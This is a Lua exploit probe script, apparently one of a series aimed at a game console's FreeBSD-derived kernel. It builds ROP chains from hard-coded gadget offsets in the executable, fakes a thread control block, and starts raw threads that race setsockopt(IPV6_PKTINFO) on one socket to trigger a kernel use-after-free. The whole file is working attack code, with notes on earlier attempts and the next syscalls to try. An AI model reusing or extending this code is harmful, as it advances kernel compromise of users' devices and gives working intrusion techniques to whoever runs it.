-- CRASH_CLASS: HIGH
-- PROBE 1402a: Dual setsockopt(IPV6_PKTINFO) race on same socket
--
-- prior art: 91a tried single-shot (no pop_rdx) = 1 child + 3000 main,
--   survived. NOW we have pop_rdx at eboot+0x3B02D7.
--   1401e was WRONG: close/setsockopt race fails because fget() holds
--   refcount. The real race is TWO children both calling setsockopt
--   concurrently on the SAME socket fd. ip6_setpktopt frees old pktinfo
--   and allocates new; if INP_WLOCK is not held, the free/alloc races.
--   384b: fake TCB fix (sysarch SET_FSBASE=129)
--   396f: proven child 5-arg ROP pattern

print("=== PROBE 1402a: DUAL SETSOCKOPT RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) memory.write_dword(a, v) end
local function wq2(addr, hi, lo)
    wd(addr, lo); wd(addr + 4, hi)
end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function add_off(hi, lo, off)
    lo = lo + off
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return hi, lo
end

local sc_socket     = mk(97)
local sc_close      = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_socketpair = mk(135)
local sc_read       = mk(3)
local sc_write      = mk(4)
local sc_nanosleep  = mk(240)

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local IPPROTO_UDP = 17

-- Get eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Gadgets
local g = {}
local function gadget(name, off)
    local hi, lo = add_off(eb_hi, eb_lo, off)
    g[name] = {hi, lo}
end
gadget("pop_rax", 0x992)
gadget("pop_rdi", 0xC9DFE)
gadget("pop_rsi", 0xD77D)
gadget("pop_rdx", 0x3B02D7)
gadget("pop_rcx", 0xE64)
gadget("pop_r8",  0x991)

-- fn_addr stub (syscall entry)
local stub = N(syscall.pipe.fn_addr)
local stub_hi = math.floor(stub / 0x100000000)
local stub_lo = stub % 0x100000000
print(string.format("stub=0x%X%08X", stub_hi, stub_lo))

-- Shared fake TCB
local tcb = memory.alloc(0x1000)
local tcb_n = N(tcb)
local tcb_hi, tcb_lo = get_hi_lo(tcb)
for i = 0, 0x1000 - 4, 4 do
    wd(tcb_n + i, (i % 8 == 0) and tcb_lo or tcb_hi)
end
local tcb_ptr = memory.alloc(8)
wq2(N(tcb_ptr), tcb_hi, tcb_lo)
local tp_hi, tp_lo = get_hi_lo(tcb_ptr)

-- ============================================================
-- Child launcher (proven pattern from 396f/384b)
-- ============================================================
local STACK_SZ = 0x10000
local CHAIN_BASE = 0xE000

local function launch_child(chain)
    local stk = memory.alloc(STACK_SZ)
    local sn = N(stk)
    for i = 0, STACK_SZ - 4, 4 do wd(sn + i, 0) end

    local rsp = sn + CHAIN_BASE
    rsp = (math.floor(rsp / 16) * 16) - 8

    for i, entry in ipairs(chain) do
        local off = (i - 1) * 8
        wd(rsp + off, entry[2])
        wd(rsp + off + 4, entry[1])
    end

    local param = memory.alloc(0x40)
    local pn = N(param)
    wq2(pn + 0x00, g.pop_rax[1], g.pop_rax[2])  -- start_func = pop_rax;ret
    wq2(pn + 0x08, 0, 0)              -- arg
    wq2(pn + 0x10, get_hi_lo(stk))    -- stack_base
    wq2(pn + 0x18, 0, CHAIN_BASE)     -- stack_size
    wq2(pn + 0x20, 0, 0)              -- tls_base
    wq2(pn + 0x28, 0, 0)              -- tls_size
    local ctid = memory.alloc(8)
    wq2(pn + 0x30, get_hi_lo(ctid))   -- child_tid

    local ok_t, rv_t = pcall(function()
        return mk(455)(uint64(pn), uint64(0x38))
    end)
    if not ok_t then return -1 end
    return N(rv_t)
end

-- ============================================================
-- Phase 0: child test (sysarch + write marker + thr_exit)
-- ============================================================
print("")
print("--- phase 0: child test ---")
local spb = memory.alloc(16)
local spr = N(sc_socketpair(uint64(1), uint64(SOCK_DGRAM), uint64(0), uint64(spb)))
local sp_r = rd(N(spb)) or -1
local sp_w = rd(N(spb) + 4) or -1
print(string.format("sp=%d fds=%d,%d", spr, sp_r, sp_w))

local mark = memory.alloc(16)
wq2(N(mark), 0xCAFE, 0xBABE)
local mk_hi, mk_lo = get_hi_lo(mark)

local chain_t = {
    g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
    g.pop_rax, {0, 165}, {stub_hi, stub_lo},         -- sysarch(SET_FSBASE)
    g.pop_rdi, {0, sp_w}, g.pop_rsi, {mk_hi, mk_lo}, g.pop_rdx, {0, 8},
    g.pop_rax, {0, 4}, {stub_hi, stub_lo},            -- write(sp_w, mark, 8)
    g.pop_rdi, {0, 0}, g.pop_rax, {0, 431}, {stub_hi, stub_lo},  -- thr_exit
}
local tr = launch_child(chain_t)
print("thr_new=" .. tr)

local slp = memory.alloc(16)
wq2(N(slp), 0, 0); wd(N(slp) + 8, 50000000)  -- 50ms
sc_nanosleep(uint64(N(slp)), uint64(0))

local rbuf = memory.alloc(16); wq2(N(rbuf), 0, 0)
local rr = N(sc_read(uint64(sp_r), uint64(N(rbuf)), uint64(8)))
local rh, rl = get_hi_lo(rq(N(rbuf)))
print(string.format("read=%d data=0x%X%08X", rr, rh, rl))
sc_close(uint64(sp_r)); sc_close(uint64(sp_w))

if rh ~= 0xCAFE or rl ~= 0xBABE then
    print("CHILD FAIL — cannot proceed"); return
end
print("CHILD OK!")

-- ============================================================
-- Phase 1: PKTINFO baseline
-- ============================================================
print("")
print("--- phase 1: PKTINFO baseline ---")
local tfd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
print("test fd=" .. tfd)

-- Set PKTINFO (20 bytes: 16B in6_addr + 4B ifindex)
local pkt = memory.alloc(32)
local pn = N(pkt)
for i = 0, 31, 4 do wd(pn + i, 0) end
local r = N(sc_setsockopt(uint64(tfd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pn), uint64(20)))
print("setsockopt(PKTINFO)=" .. r)
if r ~= 0 then print("FAIL baseline"); sc_close(uint64(tfd)); return end

-- Read back
local outbuf = memory.alloc(32)
local olen = memory.alloc(8)
wd(N(olen), 24)
local gr = N(sc_getsockopt(uint64(tfd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(outbuf), uint64(N(olen))))
print("getsockopt(PKTINFO)=" .. gr .. " len=" .. (rd(N(olen)) or 0))
sc_close(uint64(tfd))

-- ============================================================
-- Phase 2: sys 624 VM-op counter baseline
-- ============================================================
print("")
print("--- phase 2: VM counter baseline ---")
local sc624 = mk(624)
local vm_base = N(sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print("vm_base=" .. vm_base)

-- ============================================================
-- Phase 3: DUAL SETSOCKOPT RACE
-- Two children race setsockopt(IPV6_PKTINFO) on the SAME fd.
-- If ip6_setpktopt doesn't hold INP_WLOCK, both threads may
-- free/realloc in6p_pktinfo simultaneously → UAF.
-- ============================================================
print("")
print("--- phase 3: dual setsockopt race ---")

local ROUNDS = 10
local LOOP_N = 200   -- each child does 200 setsockopt calls
local anomalies = 0

for round = 1, ROUNDS do
    -- Fresh IPv6 socket each round
    local fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 then print("[R" .. round .. "] socket fail"); break end

    -- Set initial PKTINFO so in6p_outputopts is allocated
    local init_pkt = memory.alloc(32)
    for i = 0, 31, 4 do wd(N(init_pkt) + i, 0) end
    sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(N(init_pkt)), uint64(20))

    -- Prepare two PKTINFO buffers with distinct marker values
    local buf_a = memory.alloc(32)
    local buf_b = memory.alloc(32)
    local ba = N(buf_a)
    local bb = N(buf_b)
    for i = 0, 31, 4 do wd(ba + i, 0); wd(bb + i, 0) end
    -- Child A: in6_addr bytes [0..3] = 0xAAAAAAAA
    wd(ba, 0xAAAAAAAA)
    -- Child B: in6_addr bytes [0..3] = 0xBBBBBBBB
    wd(bb, 0xBBBBBBBB)

    local bah, bal = get_hi_lo(buf_a)
    local bbh, bbl = get_hi_lo(buf_b)

    -- Child A: sysarch + setsockopt(fd, PKTINFO, buf_a, 20) x LOOP_N + thr_exit
    local ca = {
        g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
        g.pop_rax, {0, 165}, {stub_hi, stub_lo},  -- sysarch
    }
    for i = 1, LOOP_N do
        -- setsockopt(fd, IPPROTO_IPV6=41, IPV6_PKTINFO=46, buf_a, 20)
        ca[#ca+1] = g.pop_rdi; ca[#ca+1] = {0, fd}
        ca[#ca+1] = g.pop_rsi; ca[#ca+1] = {0, IPPROTO_IPV6}
        ca[#ca+1] = g.pop_rdx; ca[#ca+1] = {0, IPV6_PKTINFO}
        ca[#ca+1] = g.pop_rcx; ca[#ca+1] = {bah, bal}
        ca[#ca+1] = g.pop_r8;  ca[#ca+1] = {0, 20}
        ca[#ca+1] = g.pop_rax; ca[#ca+1] = {0, 105}
        ca[#ca+1] = {stub_hi, stub_lo}  -- syscall
    end
    ca[#ca+1] = g.pop_rdi; ca[#ca+1] = {0, 0}
    ca[#ca+1] = g.pop_rax; ca[#ca+1] = {0, 431}
    ca[#ca+1] = {stub_hi, stub_lo}  -- thr_exit

    -- Child B: sysarch + setsockopt(fd, PKTINFO, buf_b, 20) x LOOP_N + thr_exit
    local cb = {
        g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
        g.pop_rax, {0, 165}, {stub_hi, stub_lo},  -- sysarch
    }
    for i = 1, LOOP_N do
        cb[#cb+1] = g.pop_rdi; cb[#cb+1] = {0, fd}
        cb[#cb+1] = g.pop_rsi; cb[#cb+1] = {0, IPPROTO_IPV6}
        cb[#cb+1] = g.pop_rdx; cb[#cb+1] = {0, IPV6_PKTINFO}
        cb[#cb+1] = g.pop_rcx; cb[#cb+1] = {bbh, bbl}
        cb[#cb+1] = g.pop_r8;  cb[#cb+1] = {0, 20}
        cb[#cb+1] = g.pop_rax; cb[#cb+1] = {0, 105}
        cb[#cb+1] = {stub_hi, stub_lo}  -- syscall
    end
    cb[#cb+1] = g.pop_rdi; cb[#cb+1] = {0, 0}
    cb[#cb+1] = g.pop_rax; cb[#cb+1] = {0, 431}
    cb[#cb+1] = {stub_hi, stub_lo}  -- thr_exit

    if round == 1 then
        print(string.format("chain_a=%d chain_b=%d entries", #ca, #cb))
    end

    -- Launch both children simultaneously
    local ra = launch_child(ca)
    local rb = launch_child(cb)

    -- Wait for children to finish (200 syscalls each ~ a few ms)
    wq2(N(slp), 0, 0); wd(N(slp) + 8, 100000000)  -- 100ms
    sc_nanosleep(uint64(N(slp)), uint64(0))

    -- Check: read back PKTINFO — should be either 0xAAAAAAAA or 0xBBBBBBBB
    local out = memory.alloc(32)
    local on = N(out)
    for i = 0, 31, 4 do wd(on + i, 0xDEAD) end  -- sentinel
    local ol = memory.alloc(8)
    wd(N(ol), 24)
    local gr2 = N(sc_getsockopt(uint64(fd), uint64(IPPROTO_IPV6),
        uint64(IPV6_PKTINFO), uint64(on), uint64(N(ol))))

    local v0 = rd(on) or 0
    local q1h, q1l = get_hi_lo(rq(on) or uint64(0))
    local q2h, q2l = get_hi_lo(rq(on + 8) or uint64(0))
    local idx = rd(on + 16) or 0

    -- Expected: v0 = 0xAAAAAAAA or 0xBBBBBBBB, rest = 0, idx = 0
    local is_a = (v0 == 0xAAAAAAAA)
    local is_b = (v0 == 0xBBBBBBBB)
    local unexpected = (not is_a and not is_b and gr2 == 0)

    if unexpected then
        anomalies = anomalies + 1
        print(string.format("[R%d] ANOMALY! getsockopt=%d v0=0x%X q1=0x%X%08X q2=0x%X%08X idx=0x%X",
            round, gr2, v0, q1h, q1l, q2h, q2l, idx))
    end

    -- Also check VM counter delta (UAF would show extra VM ops)
    local vm_now = N(sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))

    local winner = is_a and "A" or (is_b and "B" or "?")
    print(string.format("[R%d] thr=%d/%d get=%d winner=%s v0=0x%X vm=%d anom=%d",
        round, ra, rb, gr2, winner, v0, vm_now, anomalies))

    sc_close(uint64(fd))
end

-- VM counter final
local vm_end = N(sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))

print("")
print(string.format("=== RESULTS: %d rounds, %d anomalies, vm=%d->%d ===", ROUNDS, anomalies, vm_base, vm_end))
if anomalies > 0 then
    print("*** RACE DETECTED — ip6_setpktopt may be unlocked ***")
else
    print("No anomalies — ip6_setpktopt likely holds INP_WLOCK on PKTINFO path")
    print("Next: try IPV6_TCLASS(61), IPV6_HOPLIMIT(47), or SO_SNDBUF race")
end
print("=== PROBE 1402a COMPLETE ===")
